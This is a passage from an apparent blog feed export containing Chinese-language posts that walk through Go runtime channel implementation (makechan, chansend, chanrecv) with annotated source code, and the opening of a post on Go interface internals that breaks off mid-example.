id="makechan"><a href="#makechan" class="headerlink" title="makechan"></a>makechan</h3><ol><li>参数校验 2-15行</li><li>初始化hchan 17-37行</li></ol><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">makechan</span><span class="params">(t *chantype, size <span class="type">int</span>)</span></span> *hchan {</span><br><span class="line">elem := t.elem</span><br><span class="line"></span><br><span class="line"><span class="comment">// compiler checks this but be safe.</span></span><br><span class="line">  <span class="comment">// 元素类型大小限制，不能啥也放</span></span><br><span class="line"><span class="keyword">if</span> elem.size &gt;= <span class="number">1</span>&lt;&lt;<span class="number">16</span> {</span><br><span class="line">throw(<span class="string">"makechan: invalid channel element type"</span>)</span><br><span class="line">}</span><br><span class="line">  <span class="comment">// 对齐限制</span></span><br><span class="line"><span class="keyword">if</span> hchanSize%maxAlign != <span class="number">0</span> || elem.align &gt; maxAlign {</span><br><span class="line">throw(<span class="string">"makechan: bad alignment"</span>)</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">mem, overflow := math.MulUintptr(elem.size, <span class="type">uintptr</span>(size))</span><br><span class="line"><span class="keyword">if</span> overflow || mem &gt; maxAlloc-hchanSize || size &lt; <span class="number">0</span> {</span><br><span class="line"><span class="built_in">panic</span>(plainError(<span class="string">"makechan: size out of range"</span>))</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> c *hchan</span><br><span class="line"><span class="keyword">switch</span> {</span><br><span class="line"><span class="keyword">case</span> mem == <span class="number">0</span>: <span class="comment">// 没有buffer，只分配hchan结构体</span></span><br><span class="line"><span class="comment">// Queue or element size is zero.</span></span><br><span class="line">c = (*hchan)(mallocgc(hchanSize, <span class="literal">nil</span>, <span class="literal">true</span>))</span><br><span class="line"><span class="comment">// Race detector uses this location for synchronization.</span></span><br><span class="line">c.buf = c.raceaddr()</span><br><span class="line"><span class="keyword">case</span> elem.ptrdata == <span class="number">0</span>:</span><br><span class="line"><span class="comment">// 元素不含指针</span></span><br><span class="line"><span class="comment">// Allocate hchan and buf in one call. hchan和buffer一起分配，内存块连续</span></span><br><span class="line">c = (*hchan)(mallocgc(hchanSize+mem, <span class="literal">nil</span>, <span class="literal">true</span>))</span><br><span class="line">c.buf = add(unsafe.Pointer(c), hchanSize)</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="comment">// Elements contain pointers. hchan和buffer单独分配</span></span><br><span class="line">c = <span class="built_in">new</span>(hchan)</span><br><span class="line">c.buf = mallocgc(mem, elem, <span class="literal">true</span>)</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">c.elemsize = <span class="type">uint16</span>(elem.size) <span class="comment">// channel里元素的大小</span></span><br><span class="line">c.elemtype = elem <span class="comment">// 表示channel里放的是啥</span></span><br><span class="line">c.dataqsiz = <span class="type">uint</span>(size) <span class="comment">// 数组大小</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> c</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="chansend"><a href="#chansend" class="headerlink" title="chansend"></a>chansend</h3><p>chansend 函数是在编译器解析到 <code>c &lt;- x</code> 这样的代码的时候插入的，本质上就是把一个用户元素投递到 hchan 的 ringbuffer 中。chansend 调用的时候，一般用户会遇到三种情况：</p><ol><li>投递成功，非常顺利，正常返回true</li><li>投递受阻，该函数阻塞，goroutine 切走</li><li>投递失败返回false</li></ol><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">chansend</span><span class="params">(c *hchan, ep unsafe.Pointer, block <span class="type">bool</span>, callerpc <span class="type">uintptr</span>)</span></span> <span class="type">bool</span> {</span><br><span class="line">  <span class="comment">// 各种前置检测</span></span><br><span class="line"><span class="keyword">if</span> c == <span class="literal">nil</span> {</span><br><span class="line"><span class="keyword">if</span> !block {</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">}</span><br><span class="line">gopark(<span class="literal">nil</span>, <span class="literal">nil</span>, waitReasonChanSendNilChan, traceEvGoStop, <span class="number">2</span>)</span><br><span class="line">throw(<span class="string">"unreachable"</span>)</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// channel wasn't closed during the first observation.</span></span><br><span class="line"><span class="keyword">if</span> !block &amp;&amp; c.closed == <span class="number">0</span> &amp;&amp; ((c.dataqsiz == <span class="number">0</span> &amp;&amp; c.recvq.first == <span class="literal">nil</span>) ||</span><br><span class="line">(c.dataqsiz &gt; <span class="number">0</span> &amp;&amp; c.qcount == c.dataqsiz)) {</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> t0 <span class="type">int64</span></span><br><span class="line"><span class="keyword">if</span> blockprofilerate &gt; <span class="number">0</span> {</span><br><span class="line">t0 = cputicks()</span><br><span class="line">}</span><br><span class="line"><span class="comment">// 开始了，开始了</span></span><br><span class="line">  <span class="comment">// 安全第一，先锁起来</span></span><br><span class="line">lock(&amp;c.lock)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 向已关闭的channel发东西，panic</span></span><br><span class="line"><span class="keyword">if</span> c.closed != <span class="number">0</span> {</span><br><span class="line">unlock(&amp;c.lock)</span><br><span class="line"><span class="built_in">panic</span>(plainError(<span class="string">"send on closed channel"</span>))</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 场景1：发的时候刚好有人等着收，不需要走buffer，所以性能最好</span></span><br><span class="line"><span class="keyword">if</span> sg := c.recvq.dequeue(); sg != <span class="literal">nil</span> {</span><br><span class="line">send(c, sg, ep, <span class="function"><span class="keyword">func</span><span class="params">()</span></span> { unlock(&amp;c.lock) }, <span class="number">3</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">}</span><br><span class="line"><span class="comment">// 场景2：还有空间，放入buffer,索引增加</span></span><br><span class="line"><span class="keyword">if</span> c.qcount &lt; c.dataqsiz {</span><br><span class="line">    <span class="comment">// 复制，相当于 c.buf[c.sendx]</span></span><br><span class="line">qp := chanbuf(c, c.sendx)</span><br><span class="line">    <span class="comment">// 数据拷贝到buffer中</span></span><br><span class="line">typedmemmove(c.elemtype, qp, ep)</span><br><span class="line">c.sendx++</span><br><span class="line">    <span class="comment">// 环形</span></span><br><span class="line"><span class="keyword">if</span> c.sendx == c.dataqsiz {</span><br><span class="line">c.sendx = <span class="number">0</span></span><br><span class="line">}</span><br><span class="line">    <span class="comment">// 存储元素个数增加</span></span><br><span class="line">c.qcount++</span><br><span class="line">unlock(&amp;c.lock)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">}</span><br><span class="line">  <span class="comment">// 场景3</span></span><br><span class="line"><span class="comment">// 如果是非阻塞直接返回</span></span><br><span class="line"><span class="keyword">if</span> !block {</span><br><span class="line">unlock(&amp;c.lock)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// Block on the channel. Some receiver will complete our operation for us.</span></span><br><span class="line">gp := getg()</span><br><span class="line">mysg := acquireSudog()</span><br><span class="line">mysg.releasetime = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> t0 != <span class="number">0</span> {</span><br><span class="line">mysg.releasetime = <span class="number">-1</span></span><br><span class="line">}</span><br><span class="line"><span class="comment">// No stack splits between assigning elem and enqueuing mysg</span></span><br><span class="line"><span class="comment">// on gp.waiting where copystack can find it.</span></span><br><span class="line">mysg.elem = ep</span><br><span class="line">mysg.waitlink = <span class="literal">nil</span></span><br><span class="line">mysg.g = gp</span><br><span class="line">mysg.isSelect = <span class="literal">false</span></span><br><span class="line">mysg.c = c</span><br><span class="line">gp.waiting = mysg</span><br><span class="line">gp.param = <span class="literal">nil</span></span><br><span class="line">  <span class="comment">// goroutine相关结构入队列，等待唤醒</span></span><br><span class="line">c.sendq.enqueue(mysg)</span><br><span class="line">atomic.Store8(&amp;gp.parkingOnChan, <span class="number">1</span>)</span><br><span class="line">  <span class="comment">// 将 goroutine 转入 waiting 状态，并解锁，用户侧看就是阻塞住了。</span></span><br><span class="line">gopark(chanparkcommit, unsafe.Pointer(&amp;c.lock), waitReasonChanSend, traceEvGoBlockSend, <span class="number">2</span>)</span><br><span class="line">KeepAlive(ep)</span><br><span class="line"></span><br><span class="line"><span class="comment">// someone woke us up.</span></span><br><span class="line"><span class="keyword">if</span> mysg != gp.waiting {</span><br><span class="line">throw(<span class="string">"G waiting list is corrupted"</span>)</span><br><span class="line">}</span><br><span class="line">  <span class="comment">// 资源释放</span></span><br><span class="line">gp.waiting = <span class="literal">nil</span></span><br><span class="line">gp.activeStackChans = <span class="literal">false</span></span><br><span class="line"><span class="keyword">if</span> gp.param == <span class="literal">nil</span> {</span><br><span class="line"><span class="keyword">if</span> c.closed == <span class="number">0</span> {</span><br><span class="line">throw(<span class="string">"chansend: spurious wakeup"</span>)</span><br><span class="line">}</span><br><span class="line"><span class="built_in">panic</span>(plainError(<span class="string">"send on closed channel"</span>))</span><br><span class="line">}</span><br><span class="line">gp.param = <span class="literal">nil</span></span><br><span class="line"><span class="keyword">if</span> mysg.releasetime &gt; <span class="number">0</span> {</span><br><span class="line">blockevent(mysg.releasetime-t0, <span class="number">2</span>)</span><br><span class="line">}</span><br><span class="line">mysg.c = <span class="literal">nil</span></span><br><span class="line">releaseSudog(mysg)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>golang内执行 ==&lt;- x== 会调用chansend函数，会有三种场景：</p><ol><li><p>场景一：如果有人（ goroutine ）等着取 channel 的元素，这种场景最快乐，直接把元素给他就完了，然后把它唤醒，hchan 本身递增下 ringbuffer 索引；<strong>举一反三：kafka也有这种高效操作。</strong></p></li><li><p>场景二：如果 ringbuffer 还有空间，那么就把元素存着，这种也是场景的流程，存和取走的是异步流程，可以把 channel 理解成消息队列，生产者和消费者解耦；</p></li><li><p>场景三：ringbuffer 没空间，这个时候就要是否需要 block 了，一般来讲，<code>c &lt;- x</code> 编译出的代码都是 <code>block = true</code> ，那么什么时候 chansend 的 block 参数会是 false 呢？答案是：select 的时候；</p></li></ol><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> {</span><br><span class="line">  <span class="keyword">case</span> c &lt;- v:</span><br><span class="line">  <span class="comment">// ... foo</span></span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">  <span class="comment">// ... bar</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 编译后</span></span><br><span class="line"><span class="keyword">if</span> selectnbsend(c, v) {</span><br><span class="line">  <span class="comment">//  ... foo</span></span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line">  <span class="comment">//  ... bar</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">selectnbsend</span><span class="params">(c *hchan, elem unsafe.Pointer)</span></span> (selected <span class="type">bool</span>) {</span><br><span class="line">  <span class="comment">// 调用 chansend 函数，block 参数为 false；</span></span><br><span class="line">  <span class="keyword">return</span> chansend(c, elem, <span class="literal">false</span>, getcallerpc())</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="chanrecv"><a href="#chanrecv" class="headerlink" title="chanrecv"></a>chanrecv</h3><p>chanrecv 函数是在编译器解析到 <code> &lt;- c</code> 这样的代码的时候插入的，本质上就是从sender或 hchan 的 ringbuffer 中取一个元素。chanrecv 调用的时候，一般用户会遇到三种情况：</p><ol><li>接收成功，非常顺利，正常返回元素，true</li><li>接收受阻，该函数阻塞，goroutine 切走</li><li>接收失败返回nil，false</li></ol><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &lt;- c 对应</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">chanrecv1</span><span class="params">(c *hchan, elem unsafe.Pointer)</span></span> {</span><br><span class="line">chanrecv(c, elem, <span class="literal">true</span>)</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// v, ok := &lt;- c 对应</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">chanrecv2</span><span class="params">(c *hchan, elem unsafe.Pointer)</span></span> (received <span class="type">bool</span>) {</span><br><span class="line">_, received = chanrecv(c, elem, <span class="literal">true</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 除了select的时候，block都是true</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">chanrecv</span><span class="params">(c *hchan, ep unsafe.Pointer, block <span class="type">bool</span>)</span></span> (selected, received <span class="type">bool</span>) {</span><br><span class="line"><span class="comment">// 先各种判断</span></span><br><span class="line"><span class="keyword">if</span> c == <span class="literal">nil</span> {</span><br><span class="line"><span class="keyword">if</span> !block {</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">}</span><br><span class="line">gopark(<span class="literal">nil</span>, <span class="literal">nil</span>, waitReasonChanReceiveNilChan, traceEvGoStop, <span class="number">2</span>)</span><br><span class="line">throw(<span class="string">"unreachable"</span>)</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// incorrect behavior when racing with a close.</span></span><br><span class="line"><span class="keyword">if</span> !block &amp;&amp; (c.dataqsiz == <span class="number">0</span> &amp;&amp; c.sendq.first == <span class="literal">nil</span> ||</span><br><span class="line">c.dataqsiz &gt; <span class="number">0</span> &amp;&amp; atomic.Loaduint(&amp;c.qcount) == <span class="number">0</span>) &amp;&amp;</span><br><span class="line">atomic.Load(&amp;c.closed) == <span class="number">0</span> {</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> t0 <span class="type">int64</span></span><br><span class="line"><span class="keyword">if</span> blockprofilerate &gt; <span class="number">0</span> {</span><br><span class="line">t0 = cputicks()</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 上锁，干活</span></span><br><span class="line">lock(&amp;c.lock)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 关了且队列里没数据了</span></span><br><span class="line"><span class="keyword">if</span> c.closed != <span class="number">0</span> &amp;&amp; c.qcount == <span class="number">0</span> {</span><br><span class="line">unlock(&amp;c.lock)</span><br><span class="line"><span class="keyword">if</span> ep != <span class="literal">nil</span> {</span><br><span class="line">typedmemclr(c.elemtype, ep)</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>, <span class="literal">false</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 场景1：你想要的时候刚好有人可以给，直接交到手里就好了</span></span><br><span class="line"><span class="keyword">if</span> sg := c.sendq.dequeue(); sg != <span class="literal">nil</span> {</span><br><span class="line">    <span class="comment">// 如果 buffer 内没有剩余的元素，直接从sender拿数据，否则，从buffer的头部拿，并将sender的值放到buffer的尾部，拿一个立马在原位置放一个，能一定程度上保证有序性。</span></span><br><span class="line">recv(c, sg, ep, <span class="function"><span class="keyword">func</span><span class="params">()</span></span> { unlock(&amp;c.lock) }, <span class="number">3</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>, <span class="literal">true</span></span><br><span class="line">}</span><br><span class="line"><span class="comment">// ringbuffer内还有没拿的元素</span></span><br><span class="line"><span class="keyword">if</span> c.qcount &gt; <span class="number">0</span> {</span><br><span class="line"><span class="comment">// 从队列拿</span></span><br><span class="line">qp := chanbuf(c, c.recvx)</span><br><span class="line"><span class="keyword">if</span> ep != <span class="literal">nil</span> {</span><br><span class="line">typedmemmove(c.elemtype, ep, qp)</span><br><span class="line">}</span><br><span class="line">typedmemclr(c.elemtype, qp)</span><br><span class="line">    <span class="comment">// 加索引值</span></span><br><span class="line">c.recvx++</span><br><span class="line"><span class="keyword">if</span> c.recvx == c.dataqsiz {</span><br><span class="line">c.recvx = <span class="number">0</span></span><br><span class="line">}</span><br><span class="line">c.qcount--</span><br><span class="line">unlock(&amp;c.lock)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>, <span class="literal">true</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> !block {</span><br><span class="line">unlock(&amp;c.lock)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>, <span class="literal">false</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 没有人等着给，又没有存货，block住了</span></span><br><span class="line">gp := getg()</span><br><span class="line">mysg := acquireSudog()</span><br><span class="line">mysg.releasetime = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> t0 != <span class="number">0</span> {</span><br><span class="line">mysg.releasetime = <span class="number">-1</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">mysg.elem = ep</span><br><span class="line">mysg.waitlink = <span class="literal">nil</span></span><br><span class="line">gp.waiting = mysg</span><br><span class="line">mysg.g = gp</span><br><span class="line">mysg.isSelect = <span class="literal">false</span></span><br><span class="line">mysg.c = c</span><br><span class="line">gp.param = <span class="literal">nil</span></span><br><span class="line">  <span class="comment">// 入队等待唤醒</span></span><br><span class="line">c.recvq.enqueue(mysg)</span><br><span class="line">atomic.Store8(&amp;gp.parkingOnChan, <span class="number">1</span>)</span><br><span class="line">  <span class="comment">// goroutine切走，让出cpu</span></span><br><span class="line">gopark(chanparkcommit, unsafe.Pointer(&amp;c.lock), waitReasonChanReceive, traceEvGoBlockRecv, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// someone woke us up</span></span><br><span class="line"><span class="keyword">if</span> mysg != gp.waiting {</span><br><span class="line">throw(<span class="string">"G waiting list is corrupted"</span>)</span><br><span class="line">}</span><br><span class="line">gp.waiting = <span class="literal">nil</span></span><br><span class="line">gp.activeStackChans = <span class="literal">false</span></span><br><span class="line"><span class="keyword">if</span> mysg.releasetime &gt; <span class="number">0</span> {</span><br><span class="line">blockevent(mysg.releasetime-t0, <span class="number">2</span>)</span><br><span class="line">}</span><br><span class="line">closed := gp.param == <span class="literal">nil</span></span><br><span class="line">gp.param = <span class="literal">nil</span></span><br><span class="line">mysg.c = <span class="literal">nil</span></span><br><span class="line">releaseSudog(mysg)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>, !closed</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>可以看到send和recv代码和处理情况基本一样：</p><ol><li>如果是非阻塞模式（ block=false ），并且没有任何可用元素，返回 （selected=false，received=false），这样就不会进到 select 的 case 分支；</li><li>如果是阻塞模式（ block=true ），如果 chan 已经 closed 了，那么返回的是 （selected=true，received=false），说明需要进到 select 的分支，但是是没有取到元素的；</li><li>如果是阻塞模式，chan 还是正常状态，那么返回（selected=true，recived=true），说明正常取到了元素；</li></ol><p>select部分和send基本一致，在编译时block参数设为false，不再重复。不过recv还可以通过range的方式进行。</p><ul><li><p>for循环</p><p><code>for-range</code> 和 chan 的结束条件只有这个 chan 被 close 了，否则一直会处于这个死循环内部，因为block参数为true。</p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> m := <span class="keyword">range</span> c {</span><br><span class="line">    <span class="comment">// ...   do something</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">chanrecv2</span><span class="params">(c *hchan, elem unsafe.Pointer)</span></span> (received <span class="type">bool</span>) {</span><br><span class="line">    <span class="comment">// 注意了，这个 block=true，说明 chanrecv 内部是阻塞的；</span></span><br><span class="line">    _, received = chanrecv(c, elem, <span class="literal">true</span>)        </span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 伪代码</span></span><br><span class="line"><span class="keyword">for</span> (   ; ok = chanrecv2( c, ep )  ;   ) {</span><br><span class="line">    <span class="comment">// do something</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li></ul><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://legendtkl.com/2017/08/06/golang-channel-implement/">http://legendtkl.com/2017/08/06/golang-channel-implement/</a></p><p><a href="https://zhuanlan.zhihu.com/p/297053654">https://zhuanlan.zhihu.com/p/297053654</a></p><p><a href="https://www.cyhone.com/articles/analysis-of-golang-channel/">https://www.cyhone.com/articles/analysis-of-golang-channel/</a></p>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang-Interface底层是怎么实现的?</title>
      <link href="/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-07-16-Golang-Interface%E5%BA%95%E5%B1%82%E6%98%AF%E6%80%8E%E4%B9%88%E5%AE%9E%E7%8E%B0%E7%9A%84/"/>
      <url>/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-07-16-Golang-Interface%E5%BA%95%E5%B1%82%E6%98%AF%E6%80%8E%E4%B9%88%E5%AE%9E%E7%8E%B0%E7%9A%84/</url>
      
        <content type="html"><![CDATA[<h3 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h3><ul><li>从runtime包分析学习interface底层结构和interface断言的实现、</li></ul><h3 id="是nil，但不完全是nil"><a href="#是nil，但不完全是nil" class="headerlink" title="是nil，但不完全是nil"></a>是nil，但不完全是nil</h3><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">InterfaceTest</span><span class="params">(v <span class="keyword">interface</span>{})</span></span> {</span><br><span class="line">fmt.Println(v)</span><br><span class="line"><span class="keyword">if</span> v == <span class="literal">nil</span> {</span><br><span class="line">fmt.Println(<span class="string">"v is nil"</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">}</span><br><span class="line">fmt.Println(<span class="string">"v is not nil"</span>)</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">InterfaceTest2</span><span class="params">(v *<span class="type">int</span>)</span></span> {</span><br><span class="line">fmt.Println(v)</span><br><span class="line"><span class="keyword">if</span> v == <span class="literal">nil</span> {</span><br><span class="line">fmt.Println(<span class="string">"v is nil"</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">}</span><br><span class="line">fmt.Println(<span class="string">"v is not nil"</span>)</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line"><span class="keyword">var</span> v *<span class="type">int</span> = <span 